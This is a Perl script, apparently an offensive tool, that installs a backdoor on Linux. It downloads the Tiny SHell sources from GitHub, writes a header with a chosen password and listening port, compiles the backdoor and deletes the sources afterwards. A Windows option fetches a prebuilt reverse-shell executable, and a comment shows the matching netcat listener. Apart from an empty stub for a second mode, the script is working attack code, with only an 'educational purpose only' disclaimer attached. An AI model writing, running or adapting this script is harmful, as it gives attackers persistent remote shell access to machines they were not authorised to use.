#!/bin/perl
# perl version : 5.30
# Description : This is a simple script for backdoor linux
package DBack;

use strict;
use warnings;
use Getopt::Long;
use LWP::Simple;

Getopt::Long::Configure('bundling');

my $helpText = "
Description : This is a simple script for backdoor linux
Usage : \n
--target   | -t\t: the ip of your host
--password | -p\t: password to use (default password : 12345)
--port     |   \t: port to use (default port : 8888)
--mode     |   \t: type of backdor install (default tsh)\n\t\t1) : tsh\n\t\t2) : rsh
--windows  |   \t: pre built binaries (if this flag is activate it download .exe file)
--help     | -h\t: print this help
--verbose  | -v\t: print more verbose
(This tool is for educational purpose only)
\n\nExample :
perl dback.pl -t 192.168.1.115 --port 6565 -p \"myPass\"
";

my $versionText = "
Author \t: \@Exo-poulpe
Version \t: 0.1.0.0
This tool is for educational purpose only, usage of PerlForing for attacking targets without prior mutual consent is illegal.
Developers assume no liability and are not responsible for any misuse or damage cause by this program.
";

my $help;
my $version;
my $verbose;
my $port = 8888;
my $password = "12345";
my $mode = 1;
my $target;
my $windows;
my $out;

GetOptions(
    'password|p=s' => \$password,    # string
    'target|t=s'   => \$target,      # string
    'mode=s'   => \$mode,      # string
    'port=i'       => \$port,        # int
    'windows'      => \$windows,     # flag
    'version'      => \$version,     # flag
    'verbose|v'    => \$verbose,     # flag
    'help|h|?'     => \$help,        # flag
) or die($helpText);


# Download file from url and name from last part of url
sub Download($)
{
    my ( $url ) = @_;

    my $filename = $url;

    while(index($filename,"/") != -1)
    {
        $filename = substr($filename,index($filename,"/") + 1);
    }
    
    getstore($url,$filename);
    if(defined $verbose)
    {
        print("URL : $url\n");
        print("file saved : $filename\n");
    }
}

sub CompileTsh()
{

open my $v1, '-|', 'which gcc';
# system("which gcc");
my $GCC=$v1;
if($GCC eq "")
{
    print("GCC is not present abort mission\n");
    exit(1);
}
else
{
    if(defined $verbose)
    {
        print("GCC is present\n")
    }
}

if(defined $verbose)
{
    print("Host : $target" . "\n");
    print("Port open : $port" . "\n");
    print("Password : '$password'" . "\n");
}

# Compile #
system("mkdir", "tshfold");
chdir("tshfold");
Download("https://raw.githubusercontent.com/creaktive/tsh/master/Makefile");
Download("https://raw.githubusercontent.com/creaktive/tsh/master/aes.c");
Download("https://raw.githubusercontent.com/creaktive/tsh/master/aes.h");
Download("https://raw.githubusercontent.com/creaktive/tsh/master/sha1.h");
Download("https://raw.githubusercontent.com/creaktive/tsh/master/sha1.c");
Download("https://raw.githubusercontent.com/creaktive/tsh/master/pel.h");
Download("https://raw.githubusercontent.com/creaktive/tsh/master/pel.c");
Download("https://raw.githubusercontent.com/creaktive/tsh/master/tsh.c");
Download("https://raw.githubusercontent.com/creaktive/tsh/master/tsh.h");
Download("https://raw.githubusercontent.com/creaktive/tsh/master/tshd.c");

open(FH, '>', "tsh.h") or die $!;

print FH "
#ifndef _TSH_H
#define _TSH_H
char *secret = \"$password\";
char *cb_host = NULL;
#define SERVER_PORT $port
short int server_port = SERVER_PORT;
#define CONNECT_BACK_HOST  \"0.0.0.0\"
#define CONNECT_BACK_DELAY 5
#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3
#endif /* tsh.h */";

system("make linux");


# Clean #
unlink("tsh.h");
unlink("pel.h");
unlink("sha1.h");
unlink("aes.h");
unlink("tsh.c");
unlink("pel.c");
unlink("sha1.c");
unlink("aes.c");
unlink("tshd.c");
unlink("Makefile");

chdir("..");

}

sub CompileRevsh()
{

}

sub RevShellWindow()
{
    # Prebuilt reverse shell windows client : 'shell.exe 192.168.1.1 8888'  server : 'nc -lvp 8888'
    Download("https://github.com/infoskirmish/Window-Tools/raw/master/Simple%20Reverse%20Shell/shell.exe");
}


sub main()
{
    if ( defined $help )
    {
        print($helpText);
    }
    elsif(defined $windows)
    {
        RevShellWindow();
    }
    elsif(defined $port && defined $mode && defined $password && defined $target)
    {
        if($mode eq "1" || $mode eq "tsh")
        {
            CompileTsh();
        }
        elsif($mode eq "2" || $mode eq "revsh")
        {

        }
    }
    else
    {
        print($helpText);
    }

}

main();